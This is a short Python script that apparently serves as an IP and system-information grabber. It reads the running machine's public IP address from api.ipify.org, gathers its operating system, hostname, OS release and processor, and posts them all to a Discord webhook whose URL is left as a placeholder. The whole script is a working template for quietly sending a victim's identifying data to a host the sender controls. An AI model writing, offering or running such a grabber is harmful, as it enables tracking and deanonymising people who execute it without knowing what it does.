#pip install discord-webhook

#Created By Underscore

import platform
from requests import get
from discord_webhook import DiscordWebhook, DiscordEmbed

#Get Public IP
ip = get('https://api.ipify.org').text
uname = platform.uname()
webhook = DiscordWebhook(url="WEBHOOK URL", username="WEBHOOK NAME")


embed = DiscordEmbed(
    title="TITLE", description="DESCRIPTION", color=15242522 #decimal colour
)
embed.set_author(
    name="TITLE", #title
    url="https://github.com/Underscore0161", #link
    icon_url="https://avatars3.githubusercontent.com/u/75947030?s=460&u=771ef1f39f5487eeb843564cec251dea7ef95ee5&v=4", #pfp
)
embed.set_footer(text="Created By Underscore") #bottom
embed.set_timestamp()
embed.add_embed_field(name= "Operating System", value= f"{uname.system} ",inline=False)
embed.add_embed_field(name="System Name", value= f"{uname.node} ", inline=False)
embed.add_embed_field(name="Windows Version", value= f"{uname.release} ", inline=False)
embed.add_embed_field(name="Processor", value= f"{uname.processor} ", inline=False)
embed.add_embed_field(name="Public Ip", value='{}'.format(ip), inline=False)
webhook.add_embed(embed)
response = webhook.execute()